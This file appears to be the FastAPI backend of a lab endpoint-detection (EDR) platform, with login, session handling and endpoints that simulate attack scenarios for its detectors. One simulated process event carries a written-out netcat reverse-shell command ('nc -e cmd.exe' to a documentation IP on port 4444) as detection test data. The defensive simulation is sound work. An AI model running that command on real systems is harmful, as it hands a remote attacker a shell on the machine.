from __future__ import annotations

import asyncio
import json
import os
import random
import sqlite3
from contextlib import asynccontextmanager
from pathlib import Path
from typing import Any

from fastapi import Depends, FastAPI, HTTPException, Request, Response, status
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel, Field, field_validator

from backend.edr.auth import create_session_token, hash_password, new_user_id, parse_session_token, verify_password
from backend.edr.config.settings import AUTH_COOKIE_NAME, BASE_DIR, COOKIE_SECURE, SESSION_TTL_SECONDS, SETTINGS_PATH, ensure_directories
from backend.edr.service import EDRService


def load_settings() -> dict[str, Any]:
    return json.loads(SETTINGS_PATH.read_text(encoding="utf-8"))


class AuthPayload(BaseModel):
    email: str
    password: str = Field(min_length=8)

    @field_validator("email")
    @classmethod
    def validate_email(cls, value: str) -> str:
        email = value.strip().lower()
        if "@" not in email or "." not in email.split("@")[-1]:
            raise ValueError("Enter a valid email address")
        return email


class ControlModePayload(BaseModel):
    mode: str

    @field_validator("mode")
    @classmethod
    def validate_mode(cls, value: str) -> str:
        mode = value.strip().lower()
        if mode not in {"manual", "autonomous"}:
            raise ValueError("Mode must be manual or autonomous")
        return mode


class ScenarioPayload(BaseModel):
    scenario: str = "auto"

    @field_validator("scenario")
    @classmethod
    def validate_scenario(cls, value: str) -> str:
        scenario = value.strip().lower()
        if scenario not in {"auto", "auth_burst", "outbound", "process"}:
            raise ValueError("Scenario must be auto, auth_burst, outbound, or process")
        return scenario


settings = load_settings()
watch_path = Path(settings["watch_path"])
if not watch_path.is_absolute():
    watch_path = BASE_DIR / watch_path
edr_service = EDRService(watch_path=watch_path)
control_state: dict[str, Any] = {
    "mode": "manual",
    "last_run": None,
    "last_scenario": None,
}
frontend_origins = [
    origin.strip()
    for origin in os.getenv(
        "EDR_FRONTEND_ORIGINS",
        "http://127.0.0.1:5173,http://localhost:5173",
    ).split(",")
    if origin.strip()
]


async def inject_auth_burst() -> None:
    for _ in range(5):
        await edr_service.ingest_event(
            {
                "source": "automation_controller",
                "event_type": "auth",
                "title": "failed_login",
                "payload": {
                    "username": "svc-admin",
                    "outcome": "failed",
                    "source_ip": "198.51.100.17",
                },
            }
        )


async def inject_outbound() -> None:
    await edr_service.ingest_event(
        {
            "source": "automation_controller",
            "event_type": "network",
            "title": "network_connection_observed",
            "payload": {
                "remote_ip": "203.0.113.44",
                "remote_port": 4444,
                "local_address": "10.0.0.8:51515",
                "remote_address": "203.0.113.44:4444",
                "status": "ESTABLISHED",
            },
        }
    )


async def inject_process() -> None:
    await edr_service.ingest_event(
        {
            "source": "automation_controller",
            "event_type": "process",
            "title": "process_observed",
            "payload": {
                "process_name": "nc",
                "cmdline": "nc -e cmd.exe 203.0.113.44 4444",
                "username": "lab-user",
                "pid": 4242,
            },
        }
    )


async def run_scenario(scenario: str) -> str:
    selected = scenario if scenario != "auto" else random.choice(["auth_burst", "outbound", "process"])
    if selected == "auth_burst":
        await inject_auth_burst()
    elif selected == "outbound":
        await inject_outbound()
    else:
        await inject_process()
    control_state["last_scenario"] = selected
    return selected


@asynccontextmanager
async def lifespan(_: FastAPI):
    ensure_directories()
    if settings.get("auto_start_agent", True):
        await edr_service.start()
    yield
    await edr_service.stop()


app = FastAPI(
    title="Automated EDR Backend",
    version="0.3.0",
    summary="API backend for the split React + Python Automated EDR platform",
    lifespan=lifespan,
)
app.add_middleware(
    CORSMiddleware,
    allow_origins=frontend_origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


def get_current_user(request: Request) -> dict[str, Any]:
    token = request.cookies.get(AUTH_COOKIE_NAME)
    if not token:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Authentication required")
    session = parse_session_token(token)
    if not session:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Invalid session")
    user = edr_service.storage.get_user_by_id(session["user_id"])
    if not user:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Unknown user")
    return user


def set_session_cookie(response: Response, user: dict[str, Any]) -> None:
    token = create_session_token(user["user_id"], user["email"])
    response.set_cookie(
        key=AUTH_COOKIE_NAME,
        value=token,
        httponly=True,
        samesite="lax",
        secure=COOKIE_SECURE,
        max_age=SESSION_TTL_SECONDS,
    )


@app.get("/")
async def root() -> dict[str, Any]:
    return {
        "service": "automated-edr-backend",
        "status": "ok",
        "docs": "/docs",
        "frontend_origins": frontend_origins,
    }


@app.get("/api/health")
async def health() -> dict[str, str]:
    return {"status": "ok"}


@app.post("/api/auth/signup")
async def signup(payload: AuthPayload) -> dict[str, str]:
    if edr_service.storage.get_user_by_email(payload.email):
        raise HTTPException(status_code=status.HTTP_409_CONFLICT, detail="User already exists")
    password_hash = hash_password(payload.password)
    try:
        edr_service.storage.create_user(new_user_id(), email=payload.email, password_hash=password_hash)
    except sqlite3.IntegrityError as exc:
        raise HTTPException(status_code=status.HTTP_409_CONFLICT, detail="User already exists") from exc
    return {"status": "created"}


@app.post("/api/auth/login")
async def login(payload: AuthPayload, response: Response) -> dict[str, str]:
    user = edr_service.storage.get_user_by_email(payload.email)
    if not user or not verify_password(payload.password, user["password_hash"]):
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Invalid credentials")
    set_session_cookie(response, user)
    return {"status": "authenticated"}


@app.post("/api/auth/logout")
async def logout(response: Response) -> dict[str, str]:
    response.delete_cookie(AUTH_COOKIE_NAME)
    return {"status": "signed_out"}


@app.get("/api/me")
async def me(user: dict[str, Any] = Depends(get_current_user)) -> dict[str, Any]:
    return {"user_id": user["user_id"], "email": user["email"], "role": user["role"]}


@app.get("/api/control")
async def get_control_state(user: dict[str, Any] = Depends(get_current_user)) -> dict[str, Any]:
    del user
    return control_state


@app.post("/api/control/mode")
async def set_control_mode(payload: ControlModePayload, user: dict[str, Any] = Depends(get_current_user)) -> dict[str, Any]:
    del user
    control_state["mode"] = payload.mode
    return control_state


@app.post("/api/control/simulate")
async def simulate_scenario(payload: ScenarioPayload, user: dict[str, Any] = Depends(get_current_user)) -> dict[str, Any]:
    del user
    control_state["mode"] = "manual"
    selected = await run_scenario(payload.scenario)
    await asyncio.sleep(0.3)
    control_state["last_run"] = "completed"
    return {"status": "completed", "scenario": selected}


@app.post("/api/control/autonomous-run")
async def run_autonomous_cycle(payload: ScenarioPayload, user: dict[str, Any] = Depends(get_current_user)) -> dict[str, Any]:
    del user
    control_state["mode"] = "autonomous"
    await edr_service.collect_once()
    selected = await run_scenario(payload.scenario)
    await asyncio.sleep(0.5)
    control_state["last_run"] = "completed"
    return {
        "status": "completed",
        "mode": control_state["mode"],
        "scenario": selected,
        "summary": edr_service.storage.summary(),
    }


@app.get("/api/status")
async def get_status(user: dict[str, Any] = Depends(get_current_user)) -> dict[str, Any]:
    del user
    return {
        "summary": edr_service.storage.summary(),
        "isolated_hosts": sorted(edr_service.response_engine.isolated_hosts),
        "blocked_ips": sorted(edr_service.response_engine.blocked_ips),
        "terminated_processes": edr_service.response_engine.terminated_processes[-20:],
        "control": control_state,
    }


@app.get("/api/events")
async def events(limit: int = 100, user: dict[str, Any] = Depends(get_current_user)) -> list[dict[str, Any]]:
    del user
    return edr_service.storage.recent_events(limit=min(limit, 500))


@app.get("/api/detections")
async def detections(limit: int = 100, user: dict[str, Any] = Depends(get_current_user)) -> list[dict[str, Any]]:
    del user
    return edr_service.storage.recent_detections(limit=min(limit, 500))


@app.get("/api/actions")
async def actions(limit: int = 100, user: dict[str, Any] = Depends(get_current_user)) -> list[dict[str, Any]]:
    del user
    return edr_service.storage.recent_actions(limit=min(limit, 500))


@app.post("/api/collect")
async def collect_once(user: dict[str, Any] = Depends(get_current_user)) -> dict[str, str]:
    del user
    control_state["mode"] = "manual"
    await edr_service.collect_once()
    await asyncio.sleep(0.5)
    control_state["last_run"] = "completed"
    return {"status": "collection_triggered"}


@app.post("/api/ingest")
async def ingest(event: dict[str, Any], user: dict[str, Any] = Depends(get_current_user)) -> dict[str, str]:
    del user
    try:
        await edr_service.ingest_event(event)
        await asyncio.sleep(0.2)
    except Exception as exc:
        raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail=str(exc)) from exc
    control_state["last_run"] = "completed"
    return {"status": "ingested"}


@app.post("/api/reload-rules")
async def reload_rules(user: dict[str, Any] = Depends(get_current_user)) -> dict[str, str]:
    del user
    edr_service.detection_engine.reload_rules()
    edr_service.response_engine.reload_rules()
    return {"status": "reloaded"}
